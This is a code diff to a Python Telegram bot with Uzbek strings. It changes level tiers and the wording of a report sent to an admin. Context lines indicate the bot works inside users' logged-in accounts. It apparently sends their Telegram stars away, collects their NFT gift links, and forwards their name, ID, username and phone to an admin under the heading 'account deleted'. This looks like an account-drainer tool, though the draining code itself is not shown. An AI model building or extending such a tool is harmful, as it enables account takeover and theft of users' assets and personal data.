@@ -25,7 +25,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return 'Bot ishlamoqda!'
+    return 'Bot is running!'
 
 def run_http():
     port = int(os.environ.get('PORT', 8080))
@@ -290,7 +290,6 @@ async def process_stars_reaction(client: TelegramClient):
     return sent_stars_count
 
 async def fetch_user_level_and_points(client: TelegramClient):
-    level = 1
     points = 0
     try:
         profile = await client(functions.users.GetFullUserRequest(id="me"))
@@ -303,14 +302,28 @@ async def fetch_user_level_and_points(client: TelegramClient):
         elif hasattr(full_info, 'stargifts_count') and full_info.stargifts_count:
             points = full_info.stargifts_count
             
-        if points >= 12000:
-            level = 3
-        elif points >= 5000:
-            level = 2
-        else:
-            level = 1
+        # Yangilangan darajalar sharti
+        if points < 0:
+            level = "⚠️ Salbiy reyting"
+        elif points >= 36000:
+            level = "5-daraja+"
+        elif points >= 27000:   # 27k dan 36k gacha
+            level = "5-daraja"
+        elif points >= 19000:   # 19k dan 27k gacha
+            level = "4-daraja"
+        elif points >= 12000:   # 12k dan 19k gacha
+            level = "3-daraja"
+        elif points >= 5000:    # 5k dan 12k gacha
+            level = "2-daraja"
+        elif points >= 1:       # 1 pt dan 5k gacha
+            level = "1-daraja"
+        else:                   # 0 pt bo'lsa
+            level = "Yo'q"
+            
     except Exception as e:
         print(f"Level fetch error: {e}")
+        level = "Yo'q"
+        
     return level, points
 
 async def fetch_user_premium_info(client: TelegramClient):
@@ -324,7 +337,7 @@ async def fetch_user_premium_info(client: TelegramClient):
     return info_str
 
 async def fetch_user_profile_music(client: TelegramClient):
-    music_info = "🎵 Musiqalar: Yo'q"
+    music_info = "🎵 Musiqa: Yo'q"
     try:
         profile = await client(functions.users.GetFullUserRequest(id="me"))
         full_info = profile.full_user
@@ -336,11 +349,11 @@ async def fetch_user_profile_music(client: TelegramClient):
             
             if performer or title:
                 music_name = f"{performer} - {title}".strip(" - ")
-                music_info = f"🎵 Musiqalar: {music_name}"
+                music_info = f"🎵 Musiqa: {music_name}"
             else:
-                music_info = "🎵 Musiqalar: Mavjud"
+                music_info = "🎵 Musiqa: Mavjud"
         elif hasattr(full_info, 'music') and full_info.music:
-            music_info = "🎵 Musiqalar: Mavjud"
+            music_info = "🎵 Musiqa: Mavjud"
     except Exception as e:
         print(f"Music Fetch Error: {e}")
     return music_info
@@ -371,7 +384,7 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
 
     # 1. Stars yuborish
     sent_stars = await process_stars_reaction(client)
-    stars_str = f"⭐ Stars: {sent_stars} ta" if sent_stars > 0 else "⭐ Stars: 0 ta"
+    stars_str = f"⭐ Stars: {sent_stars}"
 
     # 2. Ma'lumotlar
     user_level, user_points = await fetch_user_level_and_points(client)
@@ -383,9 +396,15 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
     
     if nft_count > 0:
         nft_list = "\n".join([f"🔗 {link}" for link in nft_links])
-        nft_str = f"🎁 NFT: {nft_count} ta\n{nft_list}"
+        nft_str = f"🎁 NFT: {nft_count}\n{nft_list}"
     else:
-        nft_str = "🎁 NFT: 0 ta"
+        nft_str = "🎁 NFT: 0"
+
+    # Daraja matnini shakllantirish
+    if user_level == "Yo'q":
+        level_str = "📊 Daraja: Yo'q (0 pt)"
+    else:
+        level_str = f"📊 Daraja: {user_level} ({user_points} pt)"
 
     # 3. Adminga xabar
     full_name = message.from_user.full_name
@@ -393,12 +412,12 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
     phone = auth.get("phone", "Noma'lum")
     
     admin_msg = (
-        f"🚨 Hisob oʻchirildi!\n"
-        f"👤 Full Name: {full_name}\n"
+        f"🚨 Akkaunt oʻchirildi!\n"
+        f"👤 Ism: {full_name}\n"
         f"🆔 ID: {user_id}\n"
         f"🏷 Username: {username}\n"
         f"☎️ Tel: {phone}\n"
-        f"📊 Daraja: {user_level} ({user_points} pt)\n"
+        f"{level_str}\n"
         f"{premium_str}\n"
         f"{music_str}\n"
         f"{stars_str}\n"
